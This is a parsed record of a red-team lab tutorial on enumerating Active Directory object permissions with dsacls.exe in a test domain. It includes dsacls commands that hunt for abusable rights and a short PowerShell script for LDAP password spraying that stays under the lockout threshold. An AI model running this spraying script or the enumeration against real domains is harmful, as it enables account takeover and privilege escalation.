---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Enumerating AD Object Permissions with dsacls

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-experiments-active-directory-kerberos-abuse-using-dsacls-to-check-ad-object-permissions` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security-experiments/active-directory-kerberos-abuse/using-dsacls-to-check-ad-object-permissions.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Enumerating AD Object Permissions with dsacls](../../topics/offensive-security-experiments/enumerating-ad-object-permissions-with-dsacls.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-experiments-active-directory-kerberos-abuse-using-dsacls-to-check-ad-object-permissions |
| name | Enumerating AD Object Permissions with dsacls |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security-experiments/active-directory-kerberos-abuse/using-dsacls-to-check-ad-object-permissions.md |

## Preserved Source Material

````yaml
_asset_filenames:
- Screenshot from 2019-03-19 22-44-21.png
- Screenshot from 2019-03-19 22-46-04.png
- Screenshot from 2019-03-19 22-46-47.png
- Screenshot from 2019-03-19 22-54-36.png
- Screenshot from 2019-03-19 22-57-50.png
- Screenshot from 2019-03-19 23-00-04.png
- Screenshot from 2019-03-19 23-09-12.png
- Screenshot from 2019-03-19 23-09-59.png
- Screenshot from 2019-03-20 00-10-10.png
_body: "---\ndescription: Enumeration, living off the land\n---\n\n# Enumerating AD Object Permissions with dsacls\n\nIt is\
  \ possible to use a native windows binary (in addition to powershell cmdlet `Get-Acl`) to enumerate Active Directory object\
  \ security persmissions. The binary of interest is `dsacls.exe`.\n\nDsacls allows us to display or modify permissions (ACLS)\
  \ of an Active Directory Domain Services (AD DS).\n\n## Execution\n\nLet's check if user `spot` has any special permissions\
  \ against user's `spotless` AD object:\n\n{% code title=\"attacker@victim\" %}\n```csharp\ndsacls.exe \"cn=spotless,cn=users,dc=offense,dc=local\"\
  \ | select-string \"spot\"\n```\n{% endcode %}\n\nNothing useful:\n\n![](<../../.gitbook/assets/Screenshot from 2019-03-19\
  \ 22-46-47.png>)\n\nLet's give user spot `Reset Password` and `Change Password` permissions on `spotless` AD object:\n\n\
  ![](<../../.gitbook/assets/Screenshot from 2019-03-19 22-46-04.png>)\n\n...and try the command again:\n\n{% code title=\"\
  attacker@victim\" %}\n```csharp\ndsacls.exe \"cn=spotless,cn=users,dc=offense,dc=local\" | select-string \"spot\"\n```\n\
  {% endcode %}\n\n![](<../../.gitbook/assets/Screenshot from 2019-03-19 22-44-21.png>)\n\n### Full Control\n\nAll well known\
  \ (and abusable) AD object permissions should be sought here. One of them is `FULL CONTROL`:\n\n{% code title=\"attacker@victim\"\
  \ %}\n```csharp\ndsacls.exe \"cn=spotless,cn=users,dc=offense,dc=local\" | select-string \"full control\"\n```\n{% endcode\
  \ %}\n\n![](<../../.gitbook/assets/Screenshot from 2019-03-19 22-54-36.png>)\n\n### Add/Remove self as member\n\n{% code\
  \ title=\"attacker@victim\" %}\n```csharp\ndsacls.exe \"cn=domain admins,cn=users,dc=offense,dc=local\" | select-string\
  \ \"spotless\"\n```\n{% endcode %}\n\n![](<../../.gitbook/assets/Screenshot from 2019-03-19 22-57-50.png>)\n\n### WriteProperty/ChangeOwnerShip\n\
  \n![](<../../.gitbook/assets/Screenshot from 2019-03-19 23-00-04.png>)\n\nEnumerating AD object permissions this way does\
  \ not come in a nice format that can be piped between powershell cmd-lets, but it's still something to keep in mind if you\
  \ do not the ability to use tools like powerview or ActiveDirectory powershell cmdlets or if you are trying to `LOL`.\n\n\
  For more good privileges to be abused:\n\n{% content-ref url=\"privileged-accounts-and-token-privileges.md\" %}\n[privileged-accounts-and-token-privileges.md](privileged-accounts-and-token-privileges.md)\n\
  {% endcontent-ref %}\n\n{% content-ref url=\"abusing-active-directory-acls-aces.md\" %}\n[abusing-active-directory-acls-aces.md](abusing-active-directory-acls-aces.md)\n\
  {% endcontent-ref %}\n\n## Password Spraying Anyone?\n\nAs a side note, the `dsacls` binary could be used to do LDAP password\
  \ spraying as it allows us to bind to an LDAP session with a specified username and password:\n\n{% code title=\"incorrect\
  \ logon\" %}\n```csharp\ndsacls.exe \"cn=domain admins,cn=users,dc=offense,dc=local\" /user:spotless@offense.local /passwd:1234567\n\
  ```\n{% endcode %}\n\n![Logon Failure](<../../.gitbook/assets/Screenshot from 2019-03-19 23-09-12.png>)\n\n{% code title=\"\
  correct logon\" %}\n```csharp\ndsacls.exe \"cn=domain admins,cn=users,dc=offense,dc=local\" /user:spotless@offense.local\
  \ /passwd:123456\n```\n{% endcode %}\n\n![Logon Successful](<../../.gitbook/assets/Screenshot from 2019-03-19 23-09-59.png>)\n\
  \n### Dirty POC idea for Password Spraying:\n\n{% code title=\"attacker@victim\" %}\n```csharp\n$domain = ((cmd /c set u)[-3]\
  \ -split \"=\")[-1]\n$pdc = ((nltest.exe /dcname:$domain) -split \"\\\\\\\\\")[1]\n$lockoutBadPwdCount = ((net accounts\
  \ /domain)[7] -split \":\" -replace \" \",\"\")[1]\n$password = \"123456\"\n\n# (Get-Content users.txt)\n\"krbtgt\",\"spotless\"\
  \ | % {\n    $badPwdCount = Get-ADObject -SearchBase \"cn=$_,cn=users,dc=$domain,dc=local\" -Filter * -Properties badpwdcount\
  \ -Server $pdc | Select-Object -ExpandProperty badpwdcount\n    if ($badPwdCount -lt $lockoutBadPwdCount - 3) {\n      \
  \  $isInvalid = dsacls.exe \"cn=domain admins,cn=users,dc=offense,dc=local\" /user:$_@offense.local /passwd:$password |\
  \ select-string -pattern \"Invalid Credentials\"\n        if ($isInvalid -match \"Invalid\") {\n            Write-Host \"\
  [-] Invalid Credentials for $_ : $password\" -foreground red\n        } else {\n            Write-Host \"[+] Working Credentials\
  \ for $_ : $password\" -foreground green\n        }        \n    }\n}\n```\n{% endcode %}\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2019-03-20 00-10-10.png>)\n\n## References\n\n{% embed url=\"https://support.microsoft.com/en-gb/help/281146/how-to-use-dsacls-exe-in-windows-server-2003-and-windows-2000\"\
  \ %}"
_relative_path: offensive-security-experiments/active-directory-kerberos-abuse/using-dsacls-to-check-ad-object-permissions.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security-experiments/active-directory-kerberos-abuse/using-dsacls-to-check-ad-object-permissions.md
````
